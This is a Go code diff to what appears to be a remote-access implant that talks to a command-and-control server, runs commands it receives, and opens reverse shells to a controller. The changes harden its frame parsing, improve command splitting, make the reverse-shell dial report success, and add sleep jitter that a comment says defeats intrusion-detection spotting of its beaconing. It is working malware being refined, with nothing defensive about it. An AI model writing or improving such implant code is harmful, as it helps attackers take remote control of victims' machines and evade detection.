@@ -11,6 +11,7 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"math/rand"
 	"net"
 	"os"
 	"os/exec"
@@ -73,6 +74,9 @@ func readFrame(conn net.Conn) (Header, []byte, error) {
 		return nil, nil, err
 	}
 	hlen := int(binary.BigEndian.Uint32(hlenb))
+	if hlen > 65536 {
+		return nil, nil, fmt.Errorf("header too large: %d bytes (max 64 KiB)", hlen)
+	}
 	hb, err := readN(conn, hlen)
 	if err != nil {
 		return nil, nil, err
@@ -87,6 +91,9 @@ func readFrame(conn net.Conn) (Header, []byte, error) {
 		size = int(v)
 	case string:
 		size, _ = strconv.Atoi(v)
+	}
+	if size > 256*1024*1024 {
+		return nil, nil, fmt.Errorf("payload too large: %d bytes (max 256 MiB)", size)
 	}
 	var payload []byte
 	if size > 0 {
@@ -113,6 +120,39 @@ func firstString(m map[string]any, keys ...string) string {
 		}
 	}
 	return ""
+}
+
+// ---------- arg splitting ----------
+
+// splitArgs splits a command string into tokens respecting single and double
+// quotes, so paths with spaces work in non-shell exec mode.
+// Examples:
+//
+//	`ls -la`                      → ["ls", "-la"]
+//	`cat "/path/with spaces/f"`   → ["cat", "/path/with spaces/f"]
+func splitArgs(s string) []string {
+	var args []string
+	var cur strings.Builder
+	inSingle, inDouble := false, false
+	for _, r := range s {
+		switch {
+		case r == '\'' && !inDouble:
+			inSingle = !inSingle
+		case r == '"' && !inSingle:
+			inDouble = !inDouble
+		case r == ' ' && !inSingle && !inDouble:
+			if cur.Len() > 0 {
+				args = append(args, cur.String())
+				cur.Reset()
+			}
+		default:
+			cur.WriteRune(r)
+		}
+	}
+	if cur.Len() > 0 {
+		args = append(args, cur.String())
+	}
+	return args
 }
 
 // ---------- path helpers ----------
@@ -286,7 +326,7 @@ func handleExec(conn net.Conn, root string, hdr Header) {
 			cmd = exec.CommandContext(ctx, argv[0], argv[1:]...)
 		} else {
 			cstr, _ := hdr["cmd"].(string)
-			parts := strings.Fields(cstr)
+			parts := splitArgs(cstr)
 			if len(parts) == 0 {
 				_ = writeFrame(conn, Header{"type": "RESULT_EXEC", "req_id": reqID}, []byte(`{"rc":null,"stdout":"","stderr":"empty command"}`))
 				return
@@ -361,28 +401,28 @@ func handleSession(conn net.Conn, root string, hdr Header) {
 	_ = writeFrame(conn, h, payload)
 }
 
-// Reverse shell: launched in background; never blocks C2 goroutine and
-// never writes to the C2 socket from its goroutine.
+// Reverse shell: dials the controller synchronously (10s timeout) so we can
+// report success or failure back via a LOG frame, then hands the socket off
+// to a background goroutine. The goroutine never touches the C2 connection.
 func handleReverseShell(conn net.Conn, _root string, hdr Header) {
 	controllerAddr, _ := hdr["controller_addr"].(string)
 	if controllerAddr == "" {
 		_ = writeFrame(conn, Header{"type": "LOG", "message": "REVERSE_SHELL failed: controller address missing"}, nil)
 		return
 	}
-	_ = writeFrame(conn, Header{
-		"type":    "LOG",
-		"message": fmt.Sprintf("REVERSE_SHELL: launching background connector to %s", controllerAddr),
-	}, nil)
-
-	go func(addr string) {
-		rsock, err := net.Dial("tcp", addr)
-		if err != nil {
-			// avoid touching C2 socket here
-			return
-		}
+	// Dial synchronously so we can confirm the listener is reachable.
+	// Important: start your listener BEFORE sending this command.
+	d := net.Dialer{Timeout: 10 * time.Second}
+	rsock, err := d.Dial("tcp", controllerAddr)
+	if err != nil {
+		_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("REVERSE_SHELL: connect to %s failed: %v", controllerAddr, err)}, nil)
+		return
+	}
+	_ = writeFrame(conn, Header{"type": "LOG", "message": fmt.Sprintf("REVERSE_SHELL: connected to %s, spawning shell", controllerAddr)}, nil)
+	go func() {
 		defer rsock.Close()
 		_ = spawnReverseShell(rsock) // implemented in revshell_*.go
-	}(controllerAddr)
+	}()
 }
 
 // Port forward using a previously uploaded Ligolo agent binary.
@@ -868,10 +908,13 @@ func main() {
 	// Normal connection loop
 	for {
 		if err := runOnce(addr, id, *token, *root); err != nil {
-			time.Sleep(2 * time.Second)
+			// Jitter prevents a fixed beaconing pattern detectable by IDS
+			jitter := time.Duration(rand.Intn(3000)) * time.Millisecond
+			time.Sleep(2*time.Second + jitter)
 			continue
 		}
-		time.Sleep(1 * time.Second)
+		jitter := time.Duration(rand.Intn(1000)) * time.Millisecond
+		time.Sleep(1*time.Second + jitter)
 	}
 }
 
